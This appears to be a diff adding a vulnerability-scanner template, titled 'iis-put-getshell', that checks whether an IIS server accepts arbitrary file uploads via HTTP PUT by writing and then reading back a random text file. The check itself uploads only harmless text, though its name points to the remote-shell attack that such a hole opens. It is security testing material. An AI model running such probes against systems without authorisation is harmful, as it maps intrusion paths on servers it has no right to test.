@@ -1,0 +1,21 @@
+name: poc-yaml-iis-put-getshell
+set:
+  filename: randomLowercase(6)
+  fileContent: randomLowercase(6)
+
+rules:
+  - method: PUT
+    path: /{{filename}}.txt
+    body: |
+      {{fileContent}}
+    expression: |
+      response.status == 201
+  - method: GET
+    path: /{{filename}}.txt
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(fileContent))
+detail:
+  author: Cannae(github.com/thunderbarca)
+  links:
+    - https://www.cnblogs.com/-mo-/p/11295400.html
